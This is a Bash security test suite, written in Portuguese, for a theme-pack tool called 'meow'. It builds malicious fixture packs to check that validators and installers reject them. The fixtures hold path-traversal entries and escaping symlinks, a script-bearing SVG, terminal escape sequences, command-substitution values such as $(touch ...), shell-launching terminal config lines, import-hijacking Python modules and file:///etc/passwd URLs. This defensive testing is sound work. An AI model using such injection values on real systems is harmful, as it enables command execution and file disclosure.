#!/usr/bin/env bash
set -uo pipefail
RAIZ="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd -P)"

T="$(mktemp -d)" || exit 2
PAINEL=""
limpar() {
  [ -n "$PAINEL" ] && { kill "$PAINEL" 2>/dev/null; wait "$PAINEL" 2>/dev/null; }
  rm -rf "$T"
}
trap limpar EXIT INT TERM

falhas=0
ok()    { printf 'ok: %s\n' "$1"; }
falha() { printf 'FALHOU: %s\n' "$1" >&2; [ -n "${2:-}" ] && printf '%s\n' "$2" | sed 's/^/        /' >&2
          falhas=$((falhas+1)); }

CASA="$T/casa"
XDG="$T/xdg"
RAIZ_DELA="$XDG/meowsystem/packs"
SEGREDO="SEGREDO-P78-NAO-VAZA"
MARCA="$T/executou"
FORA="$T/fora"
mkdir -p "$CASA/.ssh" "$CASA/.config/meow" "$RAIZ_DELA" "$T/vazio" "$FORA/pasta" "$T/falso"
printf '%s\n' "$SEGREDO" > "$CASA/.ssh/id_ed25519"
chmod 600 "$CASA/.ssh/id_ed25519"
printf '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><!-- %s --></svg>\n' "$SEGREDO" \
  > "$FORA/arte.svg"
cp "$FORA/arte.svg" "$FORA/pasta/folder.svg"

for f in sudo pkexec su apt apt-get systemd-run loginctl pkill killall notify-send \
         systemctl gsettings dconf busctl; do
  printf '#!/bin/sh\nprintf "%%s %%s\\n" "%s" "$*" >> "%s/falsos.log"\nexit 1\n' "$f" "$T" > "$T/falso/$f"
  chmod 755 "$T/falso/$f"
done

plantar() {
  mkdir -p "$(dirname "$1")"
  printf '#!/bin/sh\ntouch "%s"\n' "$MARCA" > "$1"
  chmod 755 "$1"
}

amb() {
  env -i PATH="$T/falso:$PATH" HOME="$CASA" USER="${USER:-t}" LANG="${LANG:-C.UTF-8}" \
      XDG_DATA_HOME="$XDG" MEOW_PACKS="$T/vazio" MEOW_RAIZ="$RAIZ" \
      MEOW_CONF="$CASA/.config/meow/meow.conf" MEOW_PONTE=/nao/existe "$@"
}

MAL="$RAIZ_DELA/mal"
mkdir -p "$MAL/icones/apps" "$MAL/icones/pastas"
cp "$RAIZ/packs/dracula/paleta.json" "$MAL/"
cat > "$MAL/pack.json" <<'J'
{"formato": 1, "id": "mal", "nome": "Mal", "versao": "1.0.0", "autor": "x", "licenca": "MIT",
 "heranca": "dracula",
 "paleta": {"arquivo": "paleta.json", "flavor_padrao": "dracula"},
 "icones": {"apps": {"mapa": "icones/apps.map", "desenhos": "icones/apps/",
                     "camada": "scalable/apps", "recolorir": false},
            "pastas": {"mapa": "icones/pastas.map", "desenhos": "icones/pastas/",
                       "recolorir": false}}}
J
cat > "$MAL/icones/apps/bom.svg" <<'S'
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1" onload="fetch('/api/estado')"><script>fetch('/api/estado')</script></svg>
S
cat > "$MAL/icones/apps.map" <<'M'
mal-bom : apps/bom.svg
../../../../mal-evil-app : apps/bom.svg
mal-evil/barra : apps/bom.svg
M
printf 'mal-evil\033]0;TITULO\007 : apps/bom.svg\n' >> "$MAL/icones/apps.map"
cp "$MAL/icones/apps/bom.svg" "$MAL/icones/pastas/folder-bom.svg"
ln -s "$FORA/arte.svg" "$MAL/icones/pastas/folder-elo.svg"
cat > "$MAL/icones/pastas.map" <<'M'
folder-documents:folder-bom
../../../../mal-evil-pasta:folder-bom
folder-download:folder-elo
folder-music:../../../../../../fora/pasta/folder
M
ln -s "$FORA/pasta" "$MAL/icones/biblioteca"
ln -s "$FORA/pasta" "$MAL/icones/feitos-a-mao"
plantar "$MAL/manifesto.sh"
plantar "$MAL/icones/manifesto.sh"

MAL_ALVO="$RAIZ_DELA/mal-alvo"
mkdir -p "$MAL_ALVO/icones/apps"
cp "$RAIZ/packs/dracula/paleta.json" "$MAL_ALVO/"
cat > "$MAL_ALVO/pack.json" <<'J'
{"formato": 1, "id": "mal-alvo", "nome": "Mal alvo", "versao": "1.0.0", "autor": "x",
 "licenca": "MIT", "heranca": "dracula",
 "paleta": {"arquivo": "paleta.json", "flavor_padrao": "dracula"},
 "icones": {"apps": {"mapa": "icones/apps.map", "desenhos": "icones/apps/"}}}
J
cat > "$MAL_ALVO/icones/apps.map" <<M
mal-fora : ../../../../../../fora/arte.svg
M

MAL_CAMPO="$RAIZ_DELA/mal-campo"
mkdir -p "$MAL_CAMPO/icones"
cp "$RAIZ/packs/dracula/paleta.json" "$MAL_CAMPO/"
ln -s "$FORA/pasta" "$MAL_CAMPO/icones/elo"
cat > "$MAL_CAMPO/pack.json" <<'J'
{"formato": 1, "id": "mal-campo", "nome": "Mal campo", "versao": "1.0.0", "autor": "x",
 "licenca": "MIT", "heranca": "dracula",
 "paleta": {"arquivo": "paleta.json", "flavor_padrao": "dracula"},
 "icones": {"apps": {"mapa": "../../../../../fora/apps.map", "desenhos": "/etc/"},
            "pastas": {"desenhos": "icones/elo/", "mapa": "icones/elo/folder.svg"},
            "mimetypes": {"desenhos": "../../../../fora/pasta/"}},
 "origens": {"wallpapers": {"desenhos": "icones/elo/"}}}
J

MAL_NULO="$RAIZ_DELA/mal-nulo"
mkdir -p "$MAL_NULO/icones/apps"
cp "$RAIZ/packs/dracula/paleta.json" "$MAL_NULO/"
cat > "$MAL_NULO/pack.json" <<'J'
{"formato": 1, "id": "mal-nulo", "nome": "Mal nulo", "versao": "1.0.0", "autor": "x",
 "licenca": "MIT", "heranca": "dracula",
 "paleta": {"arquivo": "paleta.json", "flavor_padrao": "dracula"},
 "icones": {"apps": {"mapa": "icones/apps.map\u0000x", "desenhos": "icones/apps/\u0000"}}}
J
MAL_ESC="$RAIZ_DELA/mal-esc"
mkdir -p "$MAL_ESC"
cp "$RAIZ/packs/dracula/paleta.json" "$MAL_ESC/"
cat > "$MAL_ESC/pack.json" <<'J'
{"formato": 1, "id": "mal-esc", "nome": "Esc\u001b]52;c;cHduZWQ=\u0007\u001b]0;TITULO\u0007",
 "versao": "1.0.0", "autor": "x", "licenca": "MIT", "heranca": "dracula",
 "paleta": {"arquivo": "paleta.json", "flavor_padrao": "dracula"}}
J
ESC=$'\033'
MAL_UTF="$RAIZ_DELA/mal-utf"
mkdir -p "$MAL_UTF"
cp "$RAIZ/packs/dracula/paleta.json" "$MAL_UTF/"
printf '{"formato": 1, "id": "mal-utf", "nome": "a\x9b[2Jb", "heranca": "dracula", "paleta": {"arquivo": "paleta.json"}, "icones": {"apps": {"desenhos": "icones/"}}}\n' \
  > "$MAL_UTF/pack.json"

for _p in mal-fl-ponto:..:flavors mal-fl-barra:a/b:claros; do
  _id="${_p%%:*}"; _r="${_p#*:}"; _fl="${_r%%:*}"; _onde="${_r#*:}"
  mkdir -p "$RAIZ_DELA/$_id"
  python3 -I - "$RAIZ/packs/dracula/paleta.json" "$RAIZ_DELA/$_id/paleta.json" "$_fl" "$_onde" <<'PY'
import json, sys
d = json.load(open(sys.argv[1], encoding="utf-8"))
fl, onde = sys.argv[3], sys.argv[4]
d["flavors"][fl] = dict(d["flavors"]["dracula"])
d["nomes"][fl] = "Mal"
if onde == "claros":
    d["claros"].append(fl)
json.dump(d, open(sys.argv[2], "w", encoding="utf-8"))
PY
  printf '{"formato": 1, "id": "%s", "nome": "Mal flavor", "versao": "1.0.0", "autor": "x",\n "licenca": "MIT", "heranca": "dracula",\n "paleta": {"arquivo": "paleta.json", "flavor_padrao": "dracula"}}\n' \
    "$_id" > "$RAIZ_DELA/$_id/pack.json"
done

PERMITIDAS=("$RAIZ" "$RAIZ_DELA")
fora_da_raiz() {
  local l r
  while IFS= read -r l; do
    [ -n "$l" ] || continue
    for r in "${PERMITIDAS[@]}"; do
      case "$(realpath -m -- "$l")" in "$r"/*) continue 2 ;; esac
    done
    printf '%s\n' "$l"
  done
}

saida="$(printf '%s\n' '../../../../../../fora/arte.svg' "$FORA/arte.svg" '~/.ssh/id_ed25519' \
           'motor:../../../../fora/arte.svg' 'pack:dracula:../../../../../fora/arte.svg' \
           'pastas/folder-elo.svg' \
         | amb python3 "$RAIZ/scripts/pack.py" alvo "$MAL/icones" 2>/dev/null > "$T/alvo.txt"
         cat "$T/alvo.txt")"
if [ "$(grep -c . "$T/alvo.txt")" = 0 ] && [ "$(wc -l < "$T/alvo.txt")" = 6 ]; then
  ok "pack.py alvo: as seis formas de sair da raiz voltam vazias, uma linha por linha"
else
  falha "pack.py alvo deixou sair alguma forma" "$saida"
fi

vazou=""
for cat in icones.apps.mapa icones.apps.desenhos icones.pastas.desenhos icones.pastas.mapa \
           icones.mimetypes.desenhos origens.wallpapers.desenhos; do
  s="$(amb python3 "$RAIZ/scripts/pack.py" acervo mal-campo "$cat" 2>/dev/null)"
  [ -n "$s" ] && [ -n "$(printf '%s\n' "$s" | fora_da_raiz)" ] && vazou="$vazou$cat -> $s"$'\n'
  case "$s" in *"$FORA"*|/etc*) vazou="$vazou$cat -> $s"$'\n' ;; esac
done
[ -z "$vazou" ] && ok "pack.py acervo: nenhum campo com '..', absoluto ou pasta-symlink sai do pack" \
  || falha "pack.py acervo devolveu caminho fora do pack" "$vazou"

recusado="$(amb python3 "$RAIZ/scripts/pack.py" adocao mal-alvo "" 2>/dev/null | sed -n 's/^recusado=//p')"
[ "$recusado" = "mal-alvo" ] && ok "um mapa que aponta para fora recusa o pack inteiro (a máquina veste o padrão)" \
  || falha "o pack com mapa para fora não foi recusado (recusado='$recusado')"

recusado="$(amb python3 "$RAIZ/scripts/pack.py" adocao mal "" 2>/dev/null | sed -n 's/^recusado=//p')"
[ -z "$recusado" ] && ok "o pack 'mal' valida — as sondas abaixo correm contra ele, e não contra o padrão" \
  || falha "o pack 'mal' não validou; as sondas de consumidor abaixo não provam nada"

saida="$(amb python3 "$RAIZ/scripts/pack.py" validar mal-nulo 2>&1)"
if printf '%s' "$saida" | grep -q 'Traceback\|ValueError'; then
  falha "um NUL no pack.json derruba o validar com traceback" "$(printf '%s\n' "$saida" | tail -3)"
else
  ok "um NUL no pack.json é recusa, e não traceback"
fi
saida="$(amb python3 "$RAIZ/scripts/pack.py" validar mal-utf 2>&1)"
printf '%s' "$saida" | grep -q 'Traceback\|UnicodeDecodeError' \
  && falha "um pack.json que não é UTF-8 derruba o validar com traceback" "$(printf '%s\n' "$saida" | tail -2)" \
  || ok "um pack.json que não é UTF-8 é recusa, e não traceback"
saida="$(amb python3 "$RAIZ/scripts/pack.py" validar mal-esc 2>&1; amb "$RAIZ/scripts/meow" pack listar 2>&1)"
if printf '%s' "$saida" | grep -q "$ESC"; then
  falha "sequência de terminal do pack.json saiu crua no validar/listar"
else
  ok "o nome com sequência de terminal não sai cru no validar nem no meow pack listar"
fi
recusado="$(amb python3 "$RAIZ/scripts/pack.py" adocao mal-esc "" 2>/dev/null | sed -n 's/^recusado=//p')"
[ "$recusado" = "mal-esc" ] && ok "o pack com caractere de controle no nome é recusado inteiro" \
  || falha "o pack com caractere de controle no nome foi adotado (recusado='$recusado')"

for _id in mal-fl-ponto mal-fl-barra; do
  recusado="$(amb python3 "$RAIZ/scripts/pack.py" adocao "$_id" "" 2>/dev/null | sed -n 's/^recusado=//p')"
  if [ "$recusado" = "$_id" ] && ! amb python3 "$RAIZ/scripts/pack.py" validar "$_id" >/dev/null 2>&1; then
    ok "o pack com flavor fora da forma do conf ($_id) é recusado inteiro no validar"
  else
    falha "o pack com flavor '..' ou 'a/b' passou no validar ($_id, recusado='$recusado')"
  fi
done

saida="$(amb bash -c '. "$MEOW_RAIZ/scripts/lib/comum.sh"
  for c in $'"'"'\x9b\x9b[2J'"'"' $'"'"'\xff\x9b[2J'"'"' $'"'"'\xe2\x9b[2J'"'"' $'"'"'a\x90b\x9dc\x9ed\x9fe'"'"' $'"'"'\e]52;c;eA==\a'"'"'; do
    meow_texto_seguro "$c"; echo; done; meow_texto_seguro "ě" ' 2>/dev/null)"
if [ "$(printf '%s\n' "$saida" | tail -1)" = "ě" ] \
   && ! printf '%s\n' "$saida" | head -5 | LC_ALL=C grep -q $'[\x01-\x1f\x7f\x80-\x9f]'; then
  ok "meow_texto_seguro tira C0, DEL e C1 (também o cru que não é UTF-8) e deixa o ě"
else
  falha "meow_texto_seguro deixou passar controle (ou comeu o ě)" "$(printf '%s' "$saida" | od -c | head -5)"
fi

BOM_DRACULA="packs/dracula/icones/apps/$(ls "$RAIZ/packs/dracula/icones/apps" | grep '\.svg$' | head -1)"
cat > "$CASA/.config/meow/icones-escolhidos.map" <<M
../../../../mal-evil-escolha : $BOM_DRACULA
mal-evil/escolha : $BOM_DRACULA
mal-escolha-elo : $MAL/icones/pastas/folder-elo.svg
mal-escolha-ok : $BOM_DRACULA
M
saida="$(amb python3 "$RAIZ/scripts/pack.py" escolhas 2>/dev/null)"
if [ "$(printf '%s\n' "$saida" | cut -f1)" = "mal-escolha-ok" ] \
   && [ "$(printf '%s\n' "$saida" | cut -f2)" = "$(realpath "$RAIZ/$BOM_DRACULA")" ]; then
  ok "escolhas: só a linha boa vale, e o caminho sai na forma que foi conferida"
else
  falha "escolhas deixou passar nome com '/'/'..' ou symlink para fora" "$saida"
fi

printf 'PACK="mal"\nFLAVOR="dracula"\nICONES_DRACULA="sim"\nPASTAS_XDG="sim"\n' \
  > "$CASA/.config/meow/meow.conf"
TEMA="$CASA/.local/share/icons/MeowSystem-Icons"
mkdir -p "$TEMA/scalable/apps" "$TEMA/scalable/places"

amb PACK=mal FLAVOR=dracula ICONES_DRACULA=sim NOME_TEMA_ICONES=MeowSystem-Icons \
    "$RAIZ/scripts/icones_apps_dracula.sh" instalar > "$T/apps.log" 2>&1; rc=$?
if [ "$rc" -le 1 ] && [ -f "$TEMA/scalable/apps/mal-bom.svg" ] && [ -f "$TEMA/scalable/apps/mal-escolha-ok.svg" ]; then
  ok "icones_apps_dracula.sh: as linhas ruins foram puladas e as boas chegaram ao tema (rc=$rc)"
else
  falha "icones_apps_dracula.sh abortou ou não pôs o desenho bom (rc=$rc)" "$(tail -5 "$T/apps.log")"
fi
grep -q 'pulad' "$T/apps.log" && ok "icones_apps_dracula.sh contou as linhas puladas no log" \
  || falha "icones_apps_dracula.sh pulou calado" "$(cat "$T/apps.log")"
grep -q "$ESC" "$T/apps.log" && falha "icones_apps_dracula.sh repetiu crua a sequência de terminal do mapa" \
  || ok "o aviso das linhas puladas não repete cru o que o mapa trouxe"

amb PACK=mal FLAVOR=dracula PASTAS_XDG=sim ICONES_TEMA=MeowSystem-Icons \
    "$RAIZ/scripts/icones_pastas.sh" --aplicar > "$T/pastas.log" 2>&1; rc=$?
if [ "$rc" -le 1 ] && [ -f "$TEMA/scalable/places/folder-documents.svg" ]; then
  ok "icones_pastas.sh: a pasta boa chegou ao tema, as ruins ficaram de fora (rc=$rc)"
else
  falha "icones_pastas.sh abortou ou não pôs a pasta boa (rc=$rc)" "$(tail -5 "$T/pastas.log")"
fi
grep -q 'pulad' "$T/pastas.log" && ok "icones_pastas.sh contou as linhas puladas no log" \
  || falha "icones_pastas.sh pulou calado" "$(cat "$T/pastas.log")"

( exec env -i PATH="$T/falso:$PATH" HOME="$CASA" USER="${USER:-t}" LANG="${LANG:-C.UTF-8}" \
    XDG_DATA_HOME="$XDG" MEOW_PACKS="$T/vazio" MEOW_RAIZ="$RAIZ" \
    MEOW_CONF="$CASA/.config/meow/meow.conf" MEOW_PONTE=/nao/existe PACK=mal \
    "$RAIZ/scripts/app/run.sh" --sem-abrir ) > "$T/painel.log" 2>&1 &
PAINEL=$!
url=""
for _ in $(seq 1 60); do
  url="$(grep -o 'http://127\.0\.0\.1:[0-9]*/?t=[A-Za-z0-9_-]*' "$T/painel.log" | head -1)"
  [ -n "$url" ] && break
  sleep 1
done
if [ -z "$url" ]; then
  falha "o painel não subiu com o HOME de brinquedo" "$(tail -5 "$T/painel.log")"
else
  BASE="${url%%/\?t=*}"; TOK="${url##*t=}"
  glifos="$(curl -s -H "X-Meow-Token: $TOK" "$BASE/api/glifos")"
  printf '%s' "$glifos" | grep -q 'apps/bom.svg' \
    && ok "a ficha do painel responde com um pack de NUL e um que não é UTF-8 instalados ao lado" \
    || falha "a /api/glifos não respondeu (ou não trouxe o pack 'mal')" "$(tail -5 "$T/painel.log")"
  if printf '%s' "$glifos" | grep -q "mal/icones/biblioteca/folder.svg\|mal/icones/feitos-a-mao/folder.svg\|$FORA"; then
    falha "a ficha do painel lista desenho de pasta que é symlink para fora do pack"
  else
    ok "a ficha do painel não lista a biblioteca nem os feitos à mão que são symlink para fora"
  fi
  codigo="$(curl -s -o /dev/null -w '%{http_code}' -H "X-Meow-Token: $TOK" --get \
              --data-urlencode tipo=arquivo --data-urlencode "id=$MAL/icones/biblioteca/folder.svg" "$BASE/previa")"
  [ "$codigo" = 404 ] && ok "a /previa recusa o arquivo de dentro da pasta-symlink (404)" \
    || falha "a /previa serviu o arquivo de fora do pack (HTTP $codigo)"
  cab="$(curl -s -D - -o "$T/bom.svg" -H "X-Meow-Token: $TOK" --get \
           --data-urlencode tipo=arquivo --data-urlencode "id=$MAL/icones/apps/bom.svg" "$BASE/previa")"
  printf '%s\n' "$cab" | sed 's/\r$//' > "$T/cabecalhos.txt"
  printf '      cabeçalhos da URL do SVG:\n'; grep -iE '^(HTTP|content-type|content-security|x-content)' "$T/cabecalhos.txt" | sed 's/^/        /'
  if grep -qiE "^content-security-policy:.*default-src 'none'.*sandbox" "$T/cabecalhos.txt" \
     && grep -qi '^x-content-type-options: nosniff' "$T/cabecalhos.txt"; then
    ok "o SVG de acervo sai com CSP default-src 'none' + sandbox e nosniff: o <script> não roda na origem do painel"
  else
    falha "o SVG de acervo sai sem a CSP de sandbox ou sem nosniff"
  fi
  grep -q "$TOK" "$T/bom.svg" "$T/cabecalhos.txt" && falha "o token da sessão aparece na resposta do SVG" \
    || ok "o token da sessão não aparece na resposta do SVG"
  kill "$PAINEL" 2>/dev/null; wait "$PAINEL" 2>/dev/null; PAINEL=""
fi

CWD="$T/cwd"
mkdir -p "$CWD"
printf 'open("%s", "w").close()\nraise ImportError("plantado")\n' "$MARCA" > "$CWD/json.py"
cp "$CWD/json.py" "$CWD/re.py"
( cd "$CWD" && amb "$RAIZ/scripts/meow" pack listar > "$T/listar.log" 2>&1 )
( cd "$CWD" && amb bash -c '. "$MEOW_RAIZ/scripts/lib/comum.sh"; PACK=mal FLAVOR= meow_flavor >/dev/null 2>&1; meow_packs_validos >/dev/null 2>&1' )
[ -e "$MARCA" ] && { falha "um json.py/re.py no diretório corrente rodou dentro do meow"; rm -f "$MARCA"; } \
  || ok "nenhum módulo plantado no diretório corrente rodou (meow pack listar, scripts/lib/comum.sh)"

filtrado() {
  amb MEOW_PACKS="$T/vazio" bash -c '. "$MEOW_RAIZ/scripts/lib/comum.sh" || exit 2
    . "$MEOW_RAIZ/scripts/temas-de-apps/$0/manifesto.sh" || exit 2
    if [ "$0" = kitty ]; then _KITTY_DE=mal; _KITTY_DESEJADO="$1"; _kitty_so_cor; printf "%s\n" "$_KITTY_DESEJADO"
    else _GT_DE=mal; _GT_DESEJADO="$1"; _gt_so_cor; printf "%s\n" "$_GT_DESEJADO"; fi' "$1" "$2" 2>/dev/null
}
k="$(filtrado kitty "$(printf 'foreground #ffffff\nshell sh -c "touch %s"\nmap ctrl+x launch sh\ngeninclude x.py\ninclude /etc/hosts\n' "$MARCA")")"
g="$(filtrado gnome-terminal "$(printf "[/]\nbackground-color='#000000'\nuse-custom-command=true\ncustom-command='touch %s'\n[../fora]\nvisible-name='x'\n" "$MARCA")")"
if [ "$k" = "foreground #ffffff" ] && [ "$g" = "$(printf "[/]\nbackground-color='#000000'")" ]; then
  ok "o modelo de kitty e de GNOME Terminal de um pack só leva cor: comando, include e outra seção ficam de fora"
else
  falha "o modelo de app de um pack levou linha que não é cor" "kitty: $k"$'\n'"gnome-terminal: $g"
fi

PAPEL_CONF="$RAIZ_DELA/mal-papel-conf"
mkdir -p "$PAPEL_CONF/wallpapers"
cp "$RAIZ/packs/dracula/paleta.json" "$PAPEL_CONF/"
cat > "$PAPEL_CONF/pack.json" <<J
{"formato": 1, "id": "mal-papel-conf", "nome": "Mal papel", "versao": "1.0.0", "autor": "x",
 "licenca": "MIT", "heranca": "dracula",
 "paleta": {"arquivo": "paleta.json", "flavor_padrao": "dracula"},
 "origens": {"wallpapers": {"repo_do_conf": "a[\$(touch $MARCA)]", "commit_do_conf": "HOME"}}}
J
adotado() { amb python3 "$RAIZ/scripts/pack.py" adocao "$1" "" 2>/dev/null | sed -n 's/^recusado=//p'; }
saida="$(amb python3 "$RAIZ/scripts/pack.py" validar mal-papel-conf 2>&1)"; rc=$?
[ "$rc" != 0 ] && grep -q 'repo_do_conf' <<< "$saida" && [ "$(adotado mal-papel-conf)" = mal-papel-conf ] \
  && ok "o validar recusa repo_do_conf que não é chave WALLPAPER_*_REPO" \
  || falha "o validar aceitou repo_do_conf com comando (rc=$rc)" "$saida"
sed -i 's/"repo_do_conf": "[^"]*"/"repo_do_conf": "WALLPAPER_X_REPO"/' "$PAPEL_CONF/pack.json"
saida="$(amb python3 "$RAIZ/scripts/pack.py" validar mal-papel-conf 2>&1)"; rc=$?
[ "$rc" != 0 ] && grep -q 'commit_do_conf' <<< "$saida" && [ "$(adotado mal-papel-conf)" = mal-papel-conf ] \
  && ok "o validar recusa commit_do_conf fora da lista (HOME)" \
  || falha "o validar aceitou commit_do_conf=HOME (rc=$rc)" "$saida"
sed -i 's/"commit_do_conf": "HOME"/"commit_do_conf": "WALLPAPER_X_COMMIT"/' "$PAPEL_CONF/pack.json"
[ -z "$(adotado mal-papel-conf)" ] \
  && ok "o validar aceita as chaves da lista (WALLPAPER_X_REPO, WALLPAPER_X_COMMIT)" \
  || falha "o validar recusou as chaves certas"
PY_REAL="$(command -v python3)"
mkdir -p "$T/py-mal"
cat > "$T/py-mal/python3" <<PYF
#!/bin/sh
if [ "\$2" = wallpapers ]; then
  printf 'repo_do_conf=a[\$(touch %s)]\ncommit_do_conf=b[\$(touch %s)]\n' "$MARCA" "$MARCA"; exit 0
fi
exec "$PY_REAL" "\$@"
PYF
chmod 755 "$T/py-mal/python3"
amb PATH="$T/py-mal:$T/falso:$PATH" PACK=dracula WALLPAPER_BASE="$T/papel-1" \
  bash "$RAIZ/scripts/wallpaper.sh" estado > "$T/papel-1.log" 2>&1
[ ! -e "$MARCA" ] && ok "o wallpaper.sh não expande nome de chave fora de WALLPAPER_*_REPO/_COMMIT" \
  || { falha "o repo_do_conf do pack executou comando no wallpaper.sh" "$(tail -3 "$T/papel-1.log")"; rm -f "$MARCA"; }

ORIGEM_BOA='"repo": "dono/acervo", "commit": "0123456789abcdef0123456789abcdef01234567", "ignorar": ["svg"]'
for torta in '"repo": "a/b?x=$(id)"' '"repo": "/etc"' '"repo": "../.."' '"repo": "dono/.."' \
             '"commit": "../../fora"' '"commit": "main"' '"ignorar": ["x'"'"'); import os; ('"'"'"]' '"ignorar": "svg"'; do
  campo="${torta%%:*}"; campo="${campo//\"/}"
  python3 -I - "$PAPEL_CONF/pack.json" "$ORIGEM_BOA" "$torta" <<'PY'
import json, sys
d = json.load(open(sys.argv[1]))
d["origens"]["wallpapers"] = {**json.loads("{" + sys.argv[2] + "}"), **json.loads("{" + sys.argv[3] + "}")}
json.dump(d, open(sys.argv[1], "w"))
PY
  saida="$(amb python3 "$RAIZ/scripts/pack.py" validar mal-papel-conf 2>&1)"; rc=$?
  [ "$rc" != 0 ] && grep -q "origens.wallpapers.$campo" <<< "$saida" && [ "$(adotado mal-papel-conf)" = mal-papel-conf ] \
    && ok "o validar recusa a origem dos papéis com $torta" \
    || falha "o validar aceitou a origem dos papéis com $torta (rc=$rc)" "$saida"
done
python3 -I - "$PAPEL_CONF/pack.json" "$ORIGEM_BOA" <<'PY'
import json, sys
d = json.load(open(sys.argv[1]))
d["origens"]["wallpapers"] = json.loads("{" + sys.argv[2] + "}")
json.dump(d, open(sys.argv[1], "w"))
PY
[ -z "$(adotado mal-papel-conf)" ] \
  && ok "o validar aceita repo dono/nome, commit de 40 hex e ignorar com nome de pasta" \
  || falha "o validar recusou a origem boa dos papéis"
mkdir -p "$T/py-ignorar"
cat > "$T/py-ignorar/python3" <<PYF
#!/bin/sh
if [ "\$2" = wallpapers ]; then
  printf 'repo=dono/acervo\ncommit=0123456789abcdef0123456789abcdef01234567\nignorar=x'"'"'.split()); open("%s", "w"); y = set('"'"'\n' "$MARCA"; exit 0
fi
exec "$PY_REAL" "\$@"
PYF
cat > "$T/py-ignorar/curl" <<'CURL'
#!/bin/sh
for a in "$@"; do case "$a" in https://api.github.com/*) printf '{"tree":[{"type":"blob","path":"a/b.png"}]}'; exit 0 ;; esac; done
exit 1
CURL
chmod 755 "$T/py-ignorar/python3" "$T/py-ignorar/curl"
amb PATH="$T/py-ignorar:$T/falso:$PATH" PACK=dracula WALLPAPER_BASE="$T/papel-ignorar" \
  bash "$RAIZ/scripts/wallpaper.sh" semear > "$T/papel-ignorar.log" 2>&1
[ ! -e "$MARCA" ] && ok "o ignorar do pack chega ao wallpaper.sh como dado, nunca como código" \
  || { falha "o ignorar do pack executou código no wallpaper.sh" "$(tail -3 "$T/papel-ignorar.log")"; rm -f "$MARCA"; }

PAPEL="$RAIZ_DELA/mal-papel"
mkdir -p "$PAPEL/wallpapers/desenhos" "$T/curl"
cp "$RAIZ/packs/dracula/paleta.json" "$PAPEL/"
cat > "$PAPEL/pack.json" <<'J'
{"formato": 1, "id": "mal-papel", "nome": "Mal papel", "versao": "1.0.0", "autor": "x",
 "licenca": "MIT", "heranca": "dracula",
 "paleta": {"arquivo": "paleta.json", "flavor_padrao": "dracula"},
 "origens": {"wallpapers": {"desenhos": "wallpapers/desenhos/", "curadoria": "wallpapers/FONTES.tsv",
                            "prefixo": "mal"}}}
J
{
  printf 'arquivo\tcategoria\turl\tresolucao\n'
  printf '../../../mal-evil-sobe.png\tx\thttps://exemplo.invalido/1.png\t1x1\n'
  printf '%s/mal-evil-absoluto.png\tx\thttps://exemplo.invalido/2.png\t1x1\n' "$FORA"
  printf '.mal-evil-escondido.png\tx\thttps://exemplo.invalido/3.png\t1x1\n'
  printf 'mal-evil..ponto.png\tx\thttps://exemplo.invalido/4.png\t1x1\n'
  printf 'mal-evil$(touch %s).png\tx\thttps://exemplo.invalido/5.png\t1x1\n' "$MARCA"
  printf 'mal-evil-http.png\tx\thttp://exemplo.invalido/6.png\t1x1\n'
  printf 'mal-evil-file.png\tx\tfile:///etc/passwd\t1x1\n'
  printf 'bom.png\tx\thttps://exemplo.invalido/7.png\t1x1\n'
  printf 'doistabs.png\t\thttps://exemplo.invalido/8.png\tfile:///etc/passwd\n'
  printf 'opcao.png\t\thttps://exemplo.invalido/9.png\t-o\n'
} > "$PAPEL/wallpapers/FONTES.tsv"
cat > "$T/curl/curl" <<CURL
#!/bin/sh
printf '%s\n' "\$*" >> "$T/curl-args.log"
saida=""; url=""
while [ "\$#" -gt 0 ]; do
  case "\$1" in
    -o) saida="\$2"; shift ;; --max-time|--proto|--proto-redir) shift ;; --) url="\$2"; shift ;;
    -*) ;; *) url="\$1" ;;
  esac
  shift
done
printf '%s\n' "\$url" >> "$T/curl.log"
[ -n "\$saida" ] && printf 'png' > "\$saida"
exit 0
CURL
chmod 755 "$T/curl/curl"; : > "$T/curl.log"; : > "$T/curl-args.log"
[ -z "$(adotado mal-papel)" ] \
  || falha "o pack mal-papel não validou; a sonda da curadoria não prova nada"
amb PATH="$T/curl:$T/falso:$PATH" PACK=mal-papel WALLPAPER_BASE="$T/papel-2" \
  bash "$RAIZ/scripts/wallpaper.sh" semear > "$T/papel-2.log" 2>&1
fora_papel="$(find "$T" -name 'mal-evil*' -not -path "$RAIZ_DELA/*" 2>/dev/null)"
if [ -f "$T/papel-2/mal-papel/bom.png" ] && [ -z "$fora_papel" ] && [ ! -e "$MARCA" ] \
   && [ "$(LC_ALL=C sort "$T/curl.log" | tr '\n' ' ')" = 'https://exemplo.invalido/7.png https://exemplo.invalido/8.png https://exemplo.invalido/9.png ' ] \
   && [ "$(grep -c -- "--proto =https --proto-redir =https -o .* -- https://" "$T/curl-args.log")" = 3 ]; then
  ok "a curadoria do pack baixa só nome simples por https, dentro da pasta do pack (7 linhas más recusadas; dois tabs seguidos não trocam a URL validada)"
else
  falha "a curadoria do pack escreveu fora, baixou por outro esquema ou rodou comando" \
    "$(cat "$T/curl-args.log"; printf '%s\n' "$fora_papel"; tail -3 "$T/papel-2.log")"
fi

FOTOS_FORA="$FORA/fotos"; mkdir -p "$FOTOS_FORA"
printf '\x89PNG\r\n\x1a\n%s\n' "$SEGREDO" > "$FOTOS_FORA/foto-de-fora.png"
PFOTO="$RAIZ_DELA/mal-fotos"; mkdir -p "$PFOTO"
cp "$RAIZ/packs/dracula/paleta.json" "$PFOTO/"
cat > "$PFOTO/pack.json" <<J
{"formato": 1, "id": "mal-fotos", "nome": "Mal fotos", "versao": "1.0.0", "autor": "x",
 "licenca": "MIT", "heranca": "dracula",
 "paleta": {"arquivo": "paleta.json", "flavor_padrao": "dracula"},
 "origens": {"wallpapers": {"prefixo": "malf", "fotos": "$FOTOS_FORA"}}}
J
saida="$(amb python3 "$RAIZ/scripts/pack.py" validar mal-fotos 2>&1)"; rc=$?
[ "$rc" != 0 ] && grep -q 'origens.wallpapers.fotos' <<< "$saida" \
  && ok "o validar recusa origens.wallpapers.fotos declarada" \
  || falha "o validar aceitou fotos declarada no pack (rc=$rc)" "$saida"
saida="$(amb python3 "$RAIZ/scripts/pack.py" wallpapers mal-fotos 2>&1)"
grep -q '^fotos=' <<< "$saida" \
  && falha "o pack.py repassou a fotos declarada pelo pack" "$saida" \
  || ok "o pack.py não repassa fotos declarada: só a que ele calcula da pasta do pack"
